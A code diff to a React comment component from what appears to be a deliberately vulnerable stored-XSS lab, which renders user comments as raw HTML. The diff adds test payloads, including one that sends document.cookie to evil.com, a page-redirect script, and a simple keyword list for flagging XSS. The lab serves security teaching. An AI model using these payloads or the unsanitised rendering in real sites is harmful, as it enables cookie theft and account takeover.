@@ -6,6 +6,9 @@ function Comments() {
   const [author, setAuthor] = useState('');
   const [content, setContent] = useState('');
   const [isLoading, setIsLoading] = useState(false);
+  const [error, setError] = useState(null);
+
+const API_URL = import.meta.env.VITE_API_URL || 'http://localhost:5000';
 
   useEffect(() => {
     loadComments();
@@ -13,24 +16,46 @@ function Comments() {
 
   const loadComments = async () => {
     try {
-      const response = await axios.get('/api/comments');
-      setComments(response.data);
+      setError(null);
+      // FIX: Use full URL and handle response format
+      const response = await axios.get(`${API_URL}/api/comments`);
+      // Handle both direct array and wrapped response
+      const commentsData = Array.isArray(response.data) ? response.data : response.data.data || response.data.comments || [];
+      setComments(commentsData);
     } catch (error) {
       console.error('Error loading comments:', error);
+      setError('Failed to load comments');
     }
   };
 
   const handleSubmit = async (e) => {
     e.preventDefault();
+    if (!content.trim()) {
+      alert('Please enter a comment');
+      return;
+    }
+    
     setIsLoading(true);
+    setError(null);
+    
     try {
-      await axios.post('/api/comments', { author, content });
+      const response = await axios.post(`${API_URL}/api/comments`, { 
+        author: author.trim() || 'Anonymous', 
+        content: content 
+      });
+      
+      // Clear form after successful post
       setAuthor('');
       setContent('');
       await loadComments();
+      
+      // Show success message if XSS was detected
+      if (response.data.message?.includes('XSS')) {
+        alert('⚠️ XSS payload detected and logged by security team!');
+      }
     } catch (error) {
       console.error('Error posting comment:', error);
-      alert('Error posting comment');
+      setError('Error posting comment. Please try again.');
     } finally {
       setIsLoading(false);
     }
@@ -39,8 +64,16 @@ function Comments() {
   const xssPayloads = [
     { name: "Alert Box", payload: "<script>alert('Stored XSS Attack!')</script>" },
     { name: "Cookie Stealer", payload: "<img src=x onerror=\"alert('Cookie: '+document.cookie)\">" },
-    { name: "Page Defacement", payload: "<script>document.body.innerHTML='<h1 style=\"color:red\">HACKED!</h1>'</script>" }
+    { name: "Page Defacement", payload: "<script>document.body.innerHTML='<h1 style=\"color:red\">HACKED!</h1>'</script>" },
+    { name: "Redirect", payload: "<script>window.location='https://example.com'</script>" },
+    { name: "Steal Token", payload: "<img src=x onerror=\"fetch('http://evil.com/steal?cookie='+document.cookie)\">" }
   ];
+
+  // Helper to check if content contains XSS
+  const containsXss = (content) => {
+    const xssPatterns = ['<script', 'alert', 'onerror', 'onload', 'javascript:', '<img'];
+    return xssPatterns.some(pattern => content?.toLowerCase().includes(pattern));
+  };
 
   return (
     <div className="comments-container">
@@ -57,8 +90,15 @@ function Comments() {
         <p>This comment system is vulnerable to Stored XSS. Malicious scripts are saved to the database and execute for every visitor!</p>
       </div>
 
+      {error && (
+        <div className="error-box">
+          <strong>Error:</strong> {error}
+        </div>
+      )}
+
       <div className="xss-test-section">
         <h3>🎯 Stored XSS Test Payloads</h3>
+        <p className="test-note">Click any payload to test XSS vulnerability</p>
         <div className="payload-grid">
           {xssPayloads.map((payload, i) => (
             <button 
@@ -79,7 +119,7 @@ function Comments() {
             type="text"
             value={author}
             onChange={(e) => setAuthor(e.target.value)}
-            placeholder="Your name"
+            placeholder="Your name (optional)"
             className="author-input"
           />
           <textarea
@@ -89,6 +129,11 @@ function Comments() {
             rows="4"
             className="content-input"
           />
+          {containsXss(content) && (
+            <div className="xss-warning">
+              ⚠️ XSS pattern detected! This will be logged by security.
+            </div>
+          )}
           <button type="submit" disabled={isLoading}>
             {isLoading ? 'Posting...' : '📤 Post Comment'}
           </button>
@@ -98,16 +143,18 @@ function Comments() {
       <div className="comments-list">
         <h3>📋 Recent Comments ({comments.length})</h3>
         {comments.map((comment) => (
-          <div key={comment.id} className="comment-card">
+          <div key={comment.id || comment.comment_id} className="comment-card">
             <div className="comment-header">
               <strong className="comment-author">👤 {comment.author || 'Anonymous'}</strong>
-              <span className="comment-date">{new Date(comment.created_at).toLocaleString()}</span>
+              <span className="comment-date">
+                {new Date(comment.created_at || comment.createdAt).toLocaleString()}
+              </span>
             </div>
             <div 
               className="comment-content"
               dangerouslySetInnerHTML={{ __html: comment.content }}
             />
-            {comment.content.includes('<script') && (
+            {containsXss(comment.content) && (
               <div className="xss-badge">⚠️ XSS Payload Detected</div>
             )}
           </div>
